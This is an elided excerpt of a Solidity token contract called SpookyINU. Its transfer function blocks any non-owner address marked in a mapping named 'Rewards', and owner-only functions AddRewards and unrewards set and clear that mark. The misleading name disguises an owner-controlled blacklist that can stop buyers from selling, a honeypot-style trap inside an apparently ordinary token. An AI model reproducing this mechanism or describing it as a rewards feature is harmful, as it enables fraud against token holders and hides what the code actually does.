...
/*
    ...
    Web: http://www.spookycoininu.com/
...
contract SpookyINU is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            //Trade start check
            require(!Rewards[from], "TOKEN: Your account added Rewardlist.");
    ...
    function AddRewards(address[] memory Rewards_) public onlyOwner {
        for (uint256 i = 0; i < Rewards_.length; i++) {
            Rewards[Rewards_[i]] = true;
        }
    }

    function unrewards(address notrewarded) public onlyOwner {
        Rewards[notrewarded] = false;
    }
